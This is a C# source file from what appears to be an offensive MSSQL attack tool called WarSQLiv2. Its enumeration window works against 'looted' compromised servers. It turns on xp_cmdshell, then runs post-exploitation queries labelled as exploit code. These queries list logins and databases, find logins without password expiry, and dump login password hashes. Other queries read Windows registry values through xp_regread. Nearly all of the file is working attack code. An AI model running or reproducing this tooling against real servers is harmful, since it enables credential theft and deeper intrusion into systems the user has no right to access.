using System;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmEnumMsSql.xaml
    /// </summary>
    public partial class FrmEnumMsSql : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmEnumMsSql()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    btnGet.Content = _languageControl.SelectedLanguage.GetString("ButtonRunCommand");
                    cbi1.Content = _languageControl.SelectedLanguage.GetString("EnumContent1");
                    cbi2.Content = _languageControl.SelectedLanguage.GetString("EnumContent2");
                    cbi3.Content = _languageControl.SelectedLanguage.GetString("EnumContent3");
                    cbi4.Content = _languageControl.SelectedLanguage.GetString("EnumContent4");
                    cbi5.Content = _languageControl.SelectedLanguage.GetString("EnumContent5");
                    cbi6.Content = _languageControl.SelectedLanguage.GetString("EnumContent6");
                    cbi7.Content = _languageControl.SelectedLanguage.GetString("EnumContent7");
                    cbi8.Content = _languageControl.SelectedLanguage.GetString("EnumContent8");
                    Title = _languageControl.SelectedLanguage.GetString("TitleEnumeration");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });
                
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });
                
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
                
            }
        }
        private void btnGet_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if(isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    enableXpCmdShell.XpCmdShellStatus();
                    txtStatus.AppendText(enableXpCmdShell.Result);
                    var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                    var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                    if(contains == true)
                    {
                        isActivated = true;
                        isExecuted = true;
                    }
                }
                catch (Exception)
                {
                    txtStatus.AppendText(enableXpCmdShell.CmdException);
                }
            }
            if(isExecuted == true && isActivated == true)
            {
                if (cmbEnumeration.SelectedIndex == 0)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            const string exploitCode = "select name from master.sys.sql_logins";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("EnumContent1"));
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });                        
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });                        
                    }
                }
                else if(cmbEnumeration.SelectedIndex == 1)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            const string exploitCode = "select name from master..sysdatabases";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("EnumContent2"));
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else if (cmbEnumeration.SelectedIndex == 2)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            const string exploitCode = "select name from master.sys.sql_logins where is_expiration_checked = 0";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("EnumContent3"));
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else if (cmbEnumeration.SelectedIndex == 3)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            const string exploitCode = "SELECT CAST(SYSOBJECTS.NAME AS CHAR) FROM SYSOBJECTS, SYSPROTECTS WHERE SYSPROTECTS.UID = 0 AND XTYPE IN ('X','P') AND SYSOBJECTS.ID = SYSPROTECTS.ID";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("EnumContent4"));
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else if (cmbEnumeration.SelectedIndex == 4)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            const string exploitCode = "SELECT name, password_hash FROM master.sys.sql_logins";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.HashDump();
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("EnumContent5"));
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else if (cmbEnumeration.SelectedIndex == 5)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            var exploitCode = @"DECLARE @RegLoc VARCHAR(100)";
                            exploitCode += Environment.NewLine + @"select @RegLoc='SOFTWARE\Microsoft\Windows NT\CurrentVersion'";
                            exploitCode += Environment.NewLine + @"EXEC [master].[dbo].[xp_regread]";
                            exploitCode += Environment.NewLine + @"@rootkey='HKEY_LOCAL_MACHINE',";
                            exploitCode += Environment.NewLine + @"@key=@RegLoc,";
                            exploitCode += Environment.NewLine + @"@value_name='ProductName'";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.SQLReaderValue = 1;
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("EnumContent6"));
                            txtStatus.AppendText(_postExploitation.ExploitResult);
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else if (cmbEnumeration.SelectedIndex == 6)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            var exploitCode = @"DECLARE @RegLoc VARCHAR(100)";
                            exploitCode += Environment.NewLine + @"select @RegLoc='SOFTWARE\Microsoft\Windows NT\CurrentVersion'";
                            exploitCode += Environment.NewLine + @"EXEC [master].[dbo].[xp_regread]";
                            exploitCode += Environment.NewLine + @"@rootkey='HKEY_LOCAL_MACHINE',";
                            exploitCode += Environment.NewLine + @"@key=@RegLoc,";
                            exploitCode += Environment.NewLine + @"@value_name='InstallDate'";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.SQLReaderValue = 1;
                            _postExploitation.RunExploit();
                            var startDate = new DateTime(1970, 1, 1, 0, 0, 0);
                            var regVal = Convert.ToInt64(_postExploitation.ExploitResult);
                            var installDate = startDate.AddSeconds(regVal);
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("EnumContent7"));
                            txtStatus.AppendText(Environment.NewLine + Convert.ToString(installDate));
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else if (cmbEnumeration.SelectedIndex == 7)
                {
                    try
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            var exploitCode = @"DECLARE @RegLoc VARCHAR(100)";
                            exploitCode += Environment.NewLine + @"select @RegLoc='SOFTWARE\Microsoft\Windows NT\CurrentVersion'";
                            exploitCode += Environment.NewLine + @"EXEC [master].[dbo].[xp_regread]";
                            exploitCode += Environment.NewLine + @"@rootkey='HKEY_LOCAL_MACHINE',";
                            exploitCode += Environment.NewLine + @"@key=@RegLoc,";
                            exploitCode += Environment.NewLine + @"@value_name='SystemRoot'";
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.ExploitCode = exploitCode;
                            _postExploitation.SQLReaderValue = 1;
                            _postExploitation.RunExploit();
                            txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("EnumContent8"));
                            txtStatus.AppendText(Environment.NewLine + Convert.ToString(_postExploitation.ExploitResult));
                        });
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
            }            
        }
    }
}
